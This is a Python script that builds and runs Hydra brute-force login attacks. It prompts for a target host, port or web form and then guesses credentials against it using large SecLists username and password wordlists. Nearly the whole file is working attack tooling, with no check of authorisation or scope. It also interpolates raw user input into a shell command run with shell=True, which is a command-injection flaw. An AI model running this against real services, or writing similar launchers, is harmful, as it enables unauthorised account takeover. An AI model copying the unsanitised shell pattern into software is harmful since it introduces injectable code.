import subprocess

def prompt_input(prompt):
    return input(f"{prompt}: ")

def run_command(command):
    print(f"Executing command: {command}")
    subprocess.run(command, shell=True)

def main():
    username_file = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
    password_file = "/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt"

    service = prompt_input("Enter service (e.g., ftp, http-get, https-get, http-post-form, https-post-form)")

    if service in ["http-post-form", "https-post-form"]:
        website = prompt_input("Enter website/domain/address (without the protocol)")
        username_field = prompt_input("Enter ID/Name of username field")
        password_field = prompt_input("Enter ID/Name of password field")
        submit_field = prompt_input("Enter ID/Name of submit button")
        error_message = prompt_input("Enter error message for incorrect credentials")
        # threads = prompt_input("Enter number of threads")
        command = f"hydra {service}://{website} \":{username_field}=^USER^&{password_field}=^PASS^&{submit_field}=Submit:{error_message}\" -L {username_file} -P {password_file} -V"

    elif service in ["http-get", "https-get"]:
        website = prompt_input("Enter website/domain/address (without the protocol)")
        username_field = prompt_input("Enter ID/Name of username field")
        password_field = prompt_input("Enter ID/Name of password field")
        submit_field = prompt_input("Enter ID/Name of submit button")
        # threads = prompt_input("Enter number of threads")
        command = f"hydra -L {username_file} -P {password_file} {service}://{website} \":{username_field}=^USER^&{password_field}=^PASS^&{submit_field}=Submit\" -V"

    else:
        # host_option = prompt_input("Enter 'single' for one host or 'multiple' for multiple hosts")
        command = f"hydra {service}"

        # if host_option == "single":
        host_ip = prompt_input("Enter host IP")
        port = prompt_input("Enter port")
        command += f"://{host_ip}:{port}"

        # threads = prompt_input("Enter number of threads")
        command += f" -L {username_file} -P {password_file} -V"

        # if host_option == "multiple":
        #     host_file = prompt_input("Enter path to host file")
        #     command += f" -M {host_file}"

    run_command(command)

if __name__ == "__main__":
    main()
